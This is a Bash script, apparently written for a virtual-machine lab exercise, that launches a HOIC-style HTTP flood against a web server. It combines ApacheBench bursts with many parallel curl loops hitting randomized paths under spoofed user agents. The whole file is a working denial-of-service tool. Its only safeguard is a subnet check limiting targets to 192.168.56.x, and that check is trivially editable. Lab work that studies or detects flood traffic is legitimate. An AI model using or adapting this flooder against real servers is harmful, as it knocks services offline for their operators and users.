#!/usr/bin/env bash
# attacker-hoic.sh — HOIC-style HTTP flood (high-rate, multi-path, rotating UA)
# VM lab only. Hanya subnet 192.168.56.x diizinkan.
set -Eeuo pipefail

TARGET_IP="${TARGET_IP:-192.168.56.103}"
REQUESTS="${REQUESTS:-5000}"
CONCURRENCY="${CONCURRENCY:-50}"
DURATION="${DURATION:-60}"

log() {
  printf '[hoic] %s\n' "$*"
}

die() {
  printf '[hoic][ERROR] %s\n' "$*" >&2
  exit 1
}

validate_lab_ip() {
  case "$1" in
    192.168.56.*) ;;
    10.*|172.*|127.*|169.254.*|0.*|255.*) die "IP '$1' bukan subnet lab 192.168.56.x. Script dihentikan." ;;
    *.*.*.*) die "IP '$1' tidak diizinkan. Gunakan subnet VM lokal 192.168.56.x saja." ;;
    *) die "IP '$1' tidak valid." ;;
  esac
}

run_http_flood_ab() {
  command -v ab >/dev/null 2>&1 || die "Install dulu: sudo apt install -y apache2-utils"
  log "HOIC HTTP flood (ab) path='/': requests=$REQUESTS concurrency=$CONCURRENCY"
  ab -n "$REQUESTS" -c "$CONCURRENCY" -r \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Booster/3.0" \
     "http://$TARGET_IP/" || true
}

run_mixed_flood() {
  command -v ab >/dev/null 2>&1 || die "Install dulu: sudo apt install -y apache2-utils"
  command -v curl >/dev/null 2>&1 || die "Install dulu: sudo apt install -y curl"

  local end_ts
  end_ts=$(( $(date +%s) + DURATION ))

  log "HOIC mixed flood: concurrency=$CONCURRENCY duration=${DURATION}s"

  # Buat banyak worker paralel yang setiap worker kirim curl loop
  local pids=()
  for i in $(seq 1 "$CONCURRENCY"); do
    (
      local ua="HOIC-Worker-$i/3.0 (+http://lab.local)"
      local paths=("/" "/index.html" "/login" "/favicon.ico" "/about" "/api/ping" "/search?q=test$i")
      while [[ $(date +%s) -lt $end_ts ]]; do
        local path="${paths[$(( RANDOM % ${#paths[@]} ))]}"
        curl -fsS --max-time 3 -A "$ua" "http://$TARGET_IP$path" >/dev/null 2>&1 || true
      done
    ) &
    pids+=($!)
  done

  # Juga lempar ab serangan besar di atas
  ab -n "$REQUESTS" -c "$CONCURRENCY" -r \
     -H "User-Agent: HOIC-Cannon/3.0" \
     "http://$TARGET_IP/" >/dev/null 2>&1 || true

  for pid in "${pids[@]}"; do
    wait "$pid" 2>/dev/null || true
  done
}

main() {
  validate_lab_ip "$TARGET_IP"
  command -v curl >/dev/null 2>&1 || die "Install dulu: sudo apt install -y curl"

  log "Cek target Nginx"
  curl -fsSI --max-time 5 "http://$TARGET_IP/" || true

  log "Mulai HOIC HTTP flood: requests=$REQUESTS concurrency=$CONCURRENCY"
  # Jalankan ab burst pertama
  run_http_flood_ab

  log "Mulai HOIC mixed flood: duration=${DURATION}s"
  run_mixed_flood

  log "Selesai: HOIC HTTP flood"
}

main "$@"
